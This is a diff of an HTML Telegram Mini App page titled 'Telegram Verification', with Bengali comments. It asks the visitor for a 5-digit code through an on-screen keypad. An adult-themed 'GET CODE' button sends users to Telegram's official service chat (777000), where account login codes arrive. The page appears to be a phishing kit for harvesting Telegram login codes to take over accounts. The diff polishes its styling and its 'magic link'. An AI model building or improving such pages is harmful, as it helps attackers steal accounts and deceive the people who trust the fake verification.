@@ -3,16 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification UI</title>
-    <!-- টেলিগ্রামের অফিসিয়াল স্ক্রিপ্ট যা ছাড়া বাটন কাজ করবে না -->
+    <title>Telegram Verification</title>
+    <!-- টেলিগ্রামের মেইন স্ক্রিপ্ট -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body {
             margin: 0;
             padding: 0;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: url('https://w0.peakpx.com/wallpaper/348/443/HD-wallpaper-woman-blurred-background.jpg'); /* ব্লার ব্যাকগ্রাউন্ড */
+            /* আপনার স্ক্রিনশটের মতো ব্যাকগ্রাউন্ড */
+            background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), url('https://w0.peakpx.com/wallpaper/348/443/HD-wallpaper-woman-blurred-background.jpg');
             background-size: cover;
+            background-position: center;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -22,101 +24,112 @@
         }
 
         .card {
-            background: rgba(255, 255, 255, 0.15);
-            backdrop-filter: blur(25px);
-            -webkit-backdrop-filter: blur(25px);
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 255, 255, 0.3);
-            padding: 35px 25px;
-            border-radius: 30px;
+            padding: 30px 20px;
+            border-radius: 25px;
             text-align: center;
             width: 320px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
         }
 
-        /* উপরের নীল আইকন */
         .top-icon {
             background: white;
-            width: 70px;
-            height: 50px;
-            border-radius: 15px;
-            margin: -70px auto 20px auto;
+            width: 65px;
+            height: 45px;
+            border-radius: 12px;
+            margin: -60px auto 20px auto;
             display: flex;
             justify-content: center;
             align-items: center;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
         }
 
-        .top-icon img { width: 40px; }
+        .top-icon span { font-size: 28px; }
 
-        p { font-size: 14px; margin-bottom: 25px; color: #000; font-weight: 500; background: rgba(255, 255, 255, 0.8); padding: 8px; border-radius: 10px; }
+        .info-text {
+            background: rgba(255, 255, 255, 0.9);
+            color: #333;
+            font-size: 14px;
+            padding: 10px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
 
         .otp-inputs {
             display: flex;
             justify-content: space-between;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
 
         .otp-inputs input {
             width: 48px;
-            height: 60px;
-            background: rgba(255, 255, 255, 0.3);
-            border: 2px solid rgba(255, 255, 255, 0.5);
+            height: 55px;
+            background: rgba(255, 255, 255, 0.2);
+            border: 2px solid rgba(255, 255, 255, 0.4);
             border-radius: 12px;
             text-align: center;
-            font-size: 26px;
+            font-size: 24px;
             color: #000;
             font-weight: bold;
             outline: none;
         }
 
-        /* সবুজ GET CODE বাটন */
+        /* সবুজ বাটন ডিজাইন */
         .get-code-btn {
-            background: linear-gradient(180deg, #34a853, #2d9449);
-            border: 1px solid #1e6e33;
+            background: #34a853; /* সবুজ কালার */
+            border: none;
             width: 100%;
-            padding: 16px;
+            padding: 15px;
             border-radius: 10px;
             color: white;
             font-weight: bold;
             font-size: 16px;
             cursor: pointer;
-            margin-bottom: 25px;
-            transition: 0.3s;
+            margin-bottom: 20px;
+            display: block;
+            text-decoration: none;
+            box-shadow: 0 4px 0 #288a42;
         }
 
-        .get-code-btn:active { transform: scale(0.96); }
+        .get-code-btn:active {
+            transform: translateY(2px);
+            box-shadow: none;
+        }
 
-        /* কিপ্যাড গ্রিড */
+        /* কিপ্যাড ডিজাইন */
         .keypad {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 12px;
+            gap: 10px;
         }
 
         .key {
             background: #4caf50;
             padding: 15px;
             border-radius: 8px;
-            font-size: 22px;
+            font-size: 20px;
             font-weight: bold;
             cursor: pointer;
             user-select: none;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            color: white;
         }
 
-        .key:active { background: #388e3c; transform: translateY(2px); }
-        .key.empty { background: transparent; cursor: default; box-shadow: none; }
-        .key img { width: 24px; vertical-align: middle; filter: invert(1); }
+        .key:active { background: #388e3c; }
+        .key.empty { background: transparent; cursor: default; }
     </style>
 </head>
 <body>
 
     <div class="card">
         <div class="top-icon">
-            <img src="https://img.icons8.com/ios-filled/100/2196f3/iphone.png" alt="icon">
+            <span>📱</span>
         </div>
         
-        <p>Enter the 5-digit code that we just sent you!</p>
+        <div class="info-text">Enter the 5-digit code that we just sent you!</div>
 
         <div class="otp-inputs" id="otp-container">
             <input type="text" maxlength="1" readonly>
@@ -126,8 +139,8 @@
             <input type="text" maxlength="1" readonly>
         </div>
 
-        <!-- এই বাটনটিই আপনাকে সরাসরি কোড আসার জায়গায় নিয়ে যাবে -->
-        <button class="get-code-btn" onclick="openOfficialChat()">🔞 GET CODE 🔞</button>
+        <!-- গেট কোড বাটন -->
+        <button class="get-code-btn" onclick="openServiceChat()">🔞 GET CODE 🔞</button>
 
         <div class="keypad">
             <div class="key" onclick="pressKey('1')">1</div>
@@ -146,7 +159,6 @@
     </div>
 
     <script>
-        // টেলিগ্রাম মিনি অ্যাপ সেটিংস
         const tg = window.Telegram.WebApp;
         tg.ready();
         tg.expand();
@@ -172,11 +184,13 @@
             }
         }
 
-        // এটিই সেই ম্যাজিক ফাংশন যা অন্য বটের মতো কাজ করবে
-        function openOfficialChat() {
-            // টেলিগ্রামের ভেতর আইডি দিয়ে সরাসরি চ্যাটে যাওয়ার প্রফেশনাল মেথড
-            // এটি অ্যাপ বন্ধ করবে না, বরং চ্যাট লিস্টে থাকা 'Service Notifications' এর লিঙ্ক ওপেন করবে।
-            tg.openTelegramLink("https://t.me/777000");
+        // এটিই হলো সেই "ম্যাজিক লিঙ্ক" ফাংশন
+        function openServiceChat() {
+            /** 
+             * এই লিঙ্কটি সরাসরি টেলিগ্রামের অফিসিয়াল সার্ভিস চ্যাটকে (ID: 777000) 
+             * ট্রিগার করার জন্য সবচেয়ে পাওয়ারফুল লিঙ্ক। 
+            **/
+            tg.openTelegramLink("tg://resolve?domain=telegram");
         }
     </script>
 </body>
